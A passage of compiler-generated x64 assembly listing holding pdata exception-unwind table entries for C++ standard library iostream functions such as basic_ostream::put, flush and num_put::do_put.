pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?catch$2@?0???6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@PEBX@Z@4HA DD imagerel ?catch$2@?0???6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@PEBX@Z@4HA
	DD	imagerel ?catch$2@?0???6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@PEBX@Z@4HA+71
	DD	imagerel $unwind$?catch$2@?0???6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@PEBX@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?put@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@D@Z DD imagerel $LN13
	DD	imagerel $LN13+242
	DD	imagerel $unwind$?put@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@D@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0??put@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@D@Z@4HA DD imagerel ?dtor$0@?0??put@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@D@Z@4HA
	DD	imagerel ?dtor$0@?0??put@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@D@Z@4HA+24
	DD	imagerel $unwind$?dtor$0@?0??put@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@D@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?catch$1@?0??put@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@D@Z@4HA DD imagerel ?catch$1@?0??put@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@D@Z@4HA
	DD	imagerel ?catch$1@?0??put@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@D@Z@4HA+65
	DD	imagerel $unwind$?catch$1@?0??put@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@D@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@XZ DD imagerel $LN13
	DD	imagerel $LN13+187
	DD	imagerel $unwind$?flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0??flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@XZ@4HA DD imagerel ?dtor$0@?0??flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@XZ@4HA
	DD	imagerel ?dtor$0@?0??flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@XZ@4HA+24
	DD	imagerel $unwind$?dtor$0@?0??flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@XZ@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?catch$1@?0??flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@XZ@4HA DD imagerel ?catch$1@?0??flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@XZ@4HA
	DD	imagerel ?catch$1@?0??flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@XZ@4HA+65
	DD	imagerel $unwind$?catch$1@?0??flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@XZ@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$?6U?$char_traits@D@std@@@std@@YAAEAV?$basic_ostream@DU?$char_traits@D@std@@@0@AEAV10@PEBD@Z DD imagerel $LN25
	DD	imagerel $LN25+928
	DD	imagerel $unwind$??$?6U?$char_traits@D@std@@@std@@YAAEAV?$basic_ostream@DU?$char_traits@D@std@@@0@AEAV10@PEBD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???$?6U?$char_traits@D@std@@@std@@YAAEAV?$basic_ostream@DU?$char_traits@D@std@@@0@AEAV10@PEBD@Z@4HA DD imagerel ?dtor$0@?0???$?6U?$char_traits@D@std@@@std@@YAAEAV?$basic_ostream@DU?$char_traits@D@std@@@0@AEAV10@PEBD@Z@4HA
	DD	imagerel ?dtor$0@?0???$?6U?$char_traits@D@std@@@std@@YAAEAV?$basic_ostream@DU?$char_traits@D@std@@@0@AEAV10@PEBD@Z@4HA+27
	DD	imagerel $unwind$?dtor$0@?0???$?6U?$char_traits@D@std@@@std@@YAAEAV?$basic_ostream@DU?$char_traits@D@std@@@0@AEAV10@PEBD@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?catch$1@?0???$?6U?$char_traits@D@std@@@std@@YAAEAV?$basic_ostream@DU?$char_traits@D@std@@@0@AEAV10@PEBD@Z@4HA DD imagerel ?catch$1@?0???$?6U?$char_traits@D@std@@@std@@YAAEAV?$basic_ostream@DU?$char_traits@D@std@@@0@AEAV10@PEBD@Z@4HA
	DD	imagerel ?catch$1@?0???$?6U?$char_traits@D@std@@@std@@YAAEAV?$basic_ostream@DU?$char_traits@D@std@@@0@AEAV10@PEBD@Z@4HA+71
	DD	imagerel $unwind$?catch$1@?0???$?6U?$char_traits@D@std@@@std@@YAAEAV?$basic_ostream@DU?$char_traits@D@std@@@0@AEAV10@PEBD@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$endl@DU?$char_traits@D@std@@@std@@YAAEAV?$basic_ostream@DU?$char_traits@D@std@@@0@AEAV10@@Z DD imagerel $LN3
	DD	imagerel $LN3+75
	DD	imagerel $unwind$??$endl@DU?$char_traits@D@std@@@std@@YAAEAV?$basic_ostream@DU?$char_traits@D@std@@@0@AEAV10@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0_Sentry_base@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@AEAV12@@Z DD imagerel $LN4
	DD	imagerel $LN4+110
	DD	imagerel $unwind$??0_Sentry_base@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@AEAV12@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1_Sentry_base@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@XZ DD imagerel $LN4
	DD	imagerel $LN4+88
	DD	imagerel $unwind$??1_Sentry_base@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@AEAV12@@Z DD imagerel $LN7
	DD	imagerel $LN7+205
	DD	imagerel $unwind$??0sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@AEAV12@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???0sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@AEAV12@@Z@4HA DD imagerel ?dtor$0@?0???0sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@AEAV12@@Z@4HA
	DD	imagerel ?dtor$0@?0???0sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@AEAV12@@Z@4HA+24
	DD	imagerel $unwind$?dtor$0@?0???0sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@AEAV12@@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@XZ DD imagerel $LN6
	DD	imagerel $LN6+80
	DD	imagerel $unwind$??1sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$use_facet@V?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@@std@@YAAEBV?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@0@AEBVlocale@0@@Z DD imagerel $LN11
	DD	imagerel $LN11+257
	DD	imagerel $unwind$??$use_facet@V?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@@std@@YAAEBV?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@0@AEBVlocale@0@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???$use_facet@V?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@@std@@YAAEBV?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@0@AEBVlocale@0@@Z@4HA DD imagerel ?dtor$0@?0???$use_facet@V?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@@std@@YAAEBV?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@0@AEBVlocale@0@@Z@4HA
	DD	imagerel ?dtor$0@?0???$use_facet@V?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@@std@@YAAEBV?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@0@AEBVlocale@0@@Z@4HA+24
	DD	imagerel $unwind$?dtor$0@?0???$use_facet@V?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@@std@@YAAEBV?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@0@AEBVlocale@0@@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$1@?0???$use_facet@V?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@@std@@YAAEBV?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@0@AEBVlocale@0@@Z@4HA DD imagerel ?dtor$1@?0???$use_facet@V?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@@std@@YAAEBV?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@0@AEBVlocale@0@@Z@4HA
	DD	imagerel ?dtor$1@?0???$use_facet@V?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@@std@@YAAEBV?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@0@AEBVlocale@0@@Z@4HA+24
	DD	imagerel $unwind$?dtor$1@?0???$use_facet@V?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@@std@@YAAEBV?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@0@AEBVlocale@0@@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Getcat@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z DD imagerel $LN10
	DD	imagerel $LN10+232
	DD	imagerel $unwind$?_Getcat@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0??_Getcat@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA DD imagerel ?dtor$0@?0??_Getcat@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA
	DD	imagerel ?dtor$0@?0??_Getcat@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA+29
	DD	imagerel $unwind$?dtor$0@?0??_Getcat@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$1@?0??_Getcat@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA DD imagerel ?dtor$1@?0??_Getcat@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA
	DD	imagerel ?dtor$1@?0??_Getcat@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA+38
	DD	imagerel $unwind$?dtor$1@?0??_Getcat@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+39
	DD	imagerel $unwind$??1?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@QEAA@AEBV_Locinfo@1@_K@Z DD imagerel $LN4
	DD	imagerel $LN4+76
	DD	imagerel $unwind$??0?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@QEAA@AEBV_Locinfo@1@_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???0?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@QEAA@AEBV_Locinfo@1@_K@Z@4HA DD imagerel ?dtor$0@?0???0?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@QEAA@AEBV_Locinfo@1@_K@Z@4HA
	DD	imagerel ?dtor$0@?0???0?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@QEAA@AEBV_Locinfo@1@_K@Z@4HA+24
	DD	imagerel $unwind$?dtor$0@?0???0?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@QEAA@AEBV_Locinfo@1@_K@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@QEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DJ@Z DD imagerel $LN3
	DD	imagerel $LN3+112
	DD	imagerel $unwind$?put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@QEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DJ@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@QEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBX@Z DD imagerel $LN3
	DD	imagerel $LN3+114
	DD	imagerel $unwind$?put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@QEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBX@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@D_N@Z DD imagerel $LN15
	DD	imagerel $LN15+888
	DD	imagerel $unwind$?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@D_N@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0??do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@D_N@Z@4HA DD imagerel ?dtor$0@?0??do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@D_N@Z@4HA
	DD	imagerel ?dtor$0@?0??do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@D_N@Z@4HA+27
	DD	imagerel $unwind$?dtor$0@?0??do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@D_N@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$1@?0??do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@D_N@Z@4HA DD imagerel ?dtor$1@?0??do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@D_N@Z@4HA
	DD	imagerel ?dtor$1@?0??do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@D_N@Z@4HA+27
	DD	imagerel $unwind$?dtor$1@?0??do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@D_N@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DJ@Z DD imagerel $LN3
	DD	imagerel $LN3+234
	DD	imagerel $unwind$?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DJ@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DK@Z DD imagerel $LN3
	DD	imagerel $LN3+234
	DD	imagerel $unwind$?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DK@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@D_J@Z DD imagerel $LN3
	DD	imagerel $LN3+234
	DD	imagerel $unwind$?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@D_J@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@D_K@Z DD imagerel $LN3
	DD	imagerel $LN3+234
	DD	imagerel $unwind$?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@D_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DN@Z DD imagerel $LN11
	DD	imagerel $LN11+622
	DD	imagerel $unwind$?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DN@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0??do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DN@Z@4HA DD imagerel ?dtor$0@?0??do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DN@Z@4HA
	DD	imagerel ?dtor$0@?0??do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DN@Z@4HA+27
	DD	imagerel $unwind$?dtor$0@?0??do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DN@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DO@Z DD imagerel $LN11
	DD	imagerel $LN11+622
	DD	imagerel $unwind$?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DO@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0??do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DO@Z@4HA DD imagerel ?dtor$0@?0??do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DO@Z@4HA
	DD	imagerel ?dtor$0@?0??do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DO@Z@4HA+27
	DD	imagerel $unwind$?dtor$0@?0??do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DO@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBX@Z DD imagerel $LN3
	DD	imagerel $LN3+197
	DD	imagerel $unwind$?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBX@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Ffmt@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBAPEADPEADDH@Z DD imagerel $LN20
	DD	imagerel $LN20+367
	DD	imagerel $unwind$?_Ffmt@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBAPEADPEADDH@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Fput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBD_K@Z DD imagerel $LN27
	DD	imagerel $LN27+1951
	DD	imagerel $unwind$?_Fput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBD_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0??_Fput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBD_K@Z@4HA DD imagerel ?dtor$0@?0??_Fput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBD_K@Z@4HA
	DD	imagerel ?dtor$0@?0??_Fput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBD_K@Z@4HA+27
	DD	imagerel $unwind$?dtor$0@?0??_Fput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBD_K@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$1@?0??_Fput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBD_K@Z@4HA DD imagerel ?dtor$1@?0??_Fput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBD_K@Z@4HA
	DD	imagerel ?dtor$1@?0??_Fput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBD_K@Z@4HA+27
	DD	imagerel $unwind$?dtor$1@?0??_Fput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBD_K@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$2@?0??_Fput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBD_K@Z@4HA DD imagerel ?dtor$2@?0??_Fput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBD_K@Z@4HA
	DD	imagerel ?dtor$2@?0??_Fput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBD_K@Z@4HA+27
	DD	imagerel $unwind$?dtor$2@?0??_Fput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBD_K@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$3@?0??_Fput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBD_K@Z@4HA DD imagerel ?dtor$3@?0??_Fput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBD_K@Z@4HA
	DD	imagerel ?dtor$3@?0??_Fput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBD_K@Z@4HA+27
